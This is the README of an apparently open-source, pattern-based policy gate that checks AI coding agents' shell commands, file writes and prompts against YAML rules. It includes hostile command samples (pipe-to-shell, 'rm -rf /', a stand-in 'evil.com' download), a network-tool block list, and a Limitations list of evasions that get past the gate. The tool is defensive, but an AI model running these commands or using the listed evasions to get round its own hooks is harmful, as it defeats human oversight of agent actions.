# AI Policy Preflight

A local, deterministic policy gate for AI coding agents. Before an agent runs a shell command, writes a file or sends a prompt, Preflight checks that action against a YAML policy and answers `allow`, `warn` or `deny`. It uses pattern rules only: no model, no network calls.

<!-- Demo GIF: the hook blocking a real agent action. Drag it in here. -->

> **Not a sandbox.** Preflight is a best-effort pattern gate. It can be bypassed by obfuscation, and it only protects you if the agent actually calls it. See [Limitations](#limitations) for exactly what it misses.

## Install

```bash
git clone https://github.com/dnmohanty/ai-policy-preflight.git
cd ai-policy-preflight
pip install -e .          # Python 3.12+
```

## Quick start

An action is one JSON object:

```json
{"type": "shell",  "command": "curl https://example.com/install.sh | sh"}
{"type": "write",  "path": "/home/me/app/.env", "content": "KEY=value"}
{"type": "prompt", "text": "text that will be sent to a model"}
```

```bash
echo '{"type":"shell","command":"curl https://example.com/i.sh | sh"}' \
  | ai-preflight check --policy policies/default.yaml
# {"decision": "deny", "matched_rules": [{"id": "shell-curl-pipe", ...}], "normalized": false}
# exit code 1
```

Exit codes: `0` allow, `1` deny, `2` warn, `64` bad input, `65` invalid policy.

Other commands: `ai-preflight validate-policy <file>`, `ai-preflight eval --corpus <dir> --policy <file> [--md out.md]`, `ai-preflight hook claude-code`, `ai-preflight scan-staged`.

## Policy format

A YAML file, validated by [`policy.schema.json`](policy.schema.json) (exported from the pydantic models):

```yaml
version: 1
default_decision: allow
normalizers: [collapse_whitespace, strip_shell_quotes, decode_base64]
rules:
  - id: aws-key
    applies_to: [shell, write, prompt]
    match: { kind: regex, field: body, pattern: 'AKIA[0-9A-Z]{16}' }
    decision: deny
    message: "AWS Access Key detected."
```

`field: body` means the main text of the action (`command`, `content` or `text`). If several rules match, `deny` beats `warn`, which beats `default_decision`, and all matched rules are reported. Invalid policies, including regexes that do not compile and rules that refer to a field their action type does not have, are rejected when the policy is loaded.

Match kinds: `regex`, `glob` (matches any path form: relative, absolute, nested, case-insensitive), `entropy` (per token), `domain_allowlist` (hosts in commands that use network tools), `max_size`.

## What the default policy covers

| Class | Rules | Known gaps |
|---|---|---|
| Secrets | `aws-key`, `private-key-header` (needs key body after the header), `api-key-prefixes` (GitHub `ghp_`/`github_pat_`, `sk-…`, Slack `xox…`), `secrets-entropy` (warn; skips whole SRI hashes) | Concatenated, hex-encoded or line-split keys; tokens assembled by shell substitution |
| Protected paths | `protect-env` (`.env*`, but `.env.example`, `.sample` and `.template` are allowed), `protect-github-workflows`, `protect-ssh-dir`, `protect-pem-keys`, `protect-id-rsa`; lockfiles warn | Files written by a program rather than a shell redirect |
| Shell writes | `shell-write-env`, `shell-write-ssh` (`>`, `>>`, `tee`, `cp`, `mv`, `sed -i`, `dd of=`) | Writes done inside `python -c` or other interpreters |
| Dangerous shell | `shell-rm-root` (`rm -rf` on `/`, `~`, `$HOME`, system directories), `shell-curl-pipe`, `shell-chmod-777` (warn), `shell-git-push-force` (warn, `--force` and `-f`) | Variables, `$'\x..'` escapes, `sudo` with flags, `chmod a+rwx`, download-then-run |
| Network | `network-allowlist`: hosts not on the list in commands using `curl`, `wget`, `nc`, `scp`, `ssh`, `git clone`, etc. (allowed: github.com, api.github.com, files.pythonhosted.org, pypi.org, registry.npmjs.org) | Only listed TLDs; hosts built from variables; requests made by `python -c` or `php -r` |
| Input size | Commands over 20,000 characters and other fields over 1,000,000 are not scanned and produce a `warn` (the `max_size` match kind exists but the default policy does not use it) | — |

## Integrations

**Coding-agent hook.** `ai-preflight hook claude-code` reads a pre-tool-use event on stdin and maps `Bash`, `Write`, `Edit` and `MultiEdit` to actions.

- `deny`: prints the reason to stderr and exits `2`, which blocks the tool call.
- `warn`: prints the reason to stderr and exits `0`, so the call is **not** blocked and the message may not be shown to the user. Treat `warn` as a log entry in this mode.
- Invalid policy: exits `2` and blocks, so a typo cannot silently turn protection off.
- Unknown tools and unreadable hook input: allowed.

Check the agent's current hook documentation, since the event format can change.

**Git pre-commit.** `ai-preflight scan-staged` treats the added lines of each staged file as a `write` action and rejects the commit on `deny`. A `.pre-commit-hooks.yaml` is included.

**Audit log.** Every decision is appended to `.preflight/audit.jsonl` with a timestamp, action type, decision, matched rule IDs and a SHA-256 of the action. The action's content and any matched secret are never written to the log.

## Evaluation

The corpus is written by hand and split in two: `corpus/dev/` (63 cases, used while developing the rules) and `corpus/holdout/` (70 cases, written separately). Each case records the expected decision and the rule expected to fire, and a detection only counts when both match. Hard negatives are benign inputs that look dangerous.

```bash
ai-preflight eval --corpus corpus/dev --policy policies/default.yaml --md docs/eval-results-dev.md
ai-preflight eval --corpus corpus/holdout --policy policies/default.yaml --md docs/eval-results-holdout.md
```

| Set | Cases | Malicious detected | Benign flagged | Hard negatives flagged | Evasive detected (normalizers on / off) |
|---|---|---|---|---|---|
| Dev | 63 | 31/31 | 0/6 | 0/14 | 4/12 / 1/12 |
| Holdout | 70 | 29/30 | 0/12 | 0/12 | 5/16 / 1/16 |

Full per-class tables and every miss by ID: [`docs/eval-results-dev.md`](docs/eval-results-dev.md) and [`docs/eval-results-holdout.md`](docs/eval-results-holdout.md).

- **Normalizers matter for evasions.** Quote splitting (`r""m -rf /`), spaced-out keys and base64-encoded keys are caught with normalizers on and mostly missed with them off (4/12 vs 1/12 on dev, 5/16 vs 1/16 on holdout).
- **Most evasions still get through.** 8 of the 12 dev evasions and 11 of the 16 holdout evasions are missed. They were included on purpose (see Limitations).
- **One plain miss on holdout:** `curl … | sudo -E bash` (`ho_m21`), because the pipe-to-shell rule accepts `sudo` only without flags. It was left unfixed so the holdout stays a fair test.
- **Two "misses" are partly caught.** `ho_e09` (`curl evil.com -o f && …`) is denied by the network rule but the case expected the pipe rule. `ho_e05` (a token built by shell substitution) only raises the entropy warning.

*These numbers describe this corpus only. The rules and the cases were written by the same person, so the figures show behaviour on known patterns, not accuracy against an adversary. The dev corpus was used while tuning the rules.*

## Limitations

- **It can be bypassed.** It matches patterns in text. The evasions in the eval corpus that it misses:
  - secrets split by concatenation (`'AKIA' + '…'`), hex-encoded (`bytes.fromhex(...)`), or broken across lines;
  - shell variables and escapes (`d=/; rm -rf $d`, `TARGET=/etc; rm -rf $TARGET`, `rm -rf $'\x2f'`);
  - requests and file writes made inside an interpreter (`python -c "urllib…"`, `python -c "open('.env','w')…"`, `php -r`);
  - download-then-run (`curl … -o f && sh f`, `curl … -o f && chmod +x f && ./f`);
  - `sudo` with flags before the shell (`curl … | sudo -E bash`) and `chmod a+rwx`;
  - tokens assembled with command substitution (`'ghp_'$(echo …)`).
- **Not a sandbox.** It does not stop anything the agent does outside the hooked tools, and it only works if the agent calls it. A shell command that writes a file (`echo x > .env`) is judged as a shell command, not as a write.
- **Known false positive.** `echo 'curl | sh is bad'` is denied, because quote stripping removes the quoting.
- **Entropy is a heuristic.** Per token, 32 characters or more, threshold 4.2. Short secrets and base64 containing `/` are missed or split.
- **Network rule** recognises a fixed list of TLDs and cannot see hosts built at run time.
- **`warn` in the agent hook is advisory.** It is printed to stderr and does not block or ask for confirmation.
- **Input size.** Commands over 20,000 characters and other fields over 1,000,000 are not scanned and produce a warning, to bound regex run time.
- **No semantic understanding.** Regex rules cannot tell intent: a harmless command that looks like a dangerous one can be denied.

## Development

```bash
pip install -e ".[dev]"
pytest          # 13 tests
ruff check .
python export_schema.py   # regenerate policy.schema.json
```

## License

MIT. See [LICENSE](LICENSE).
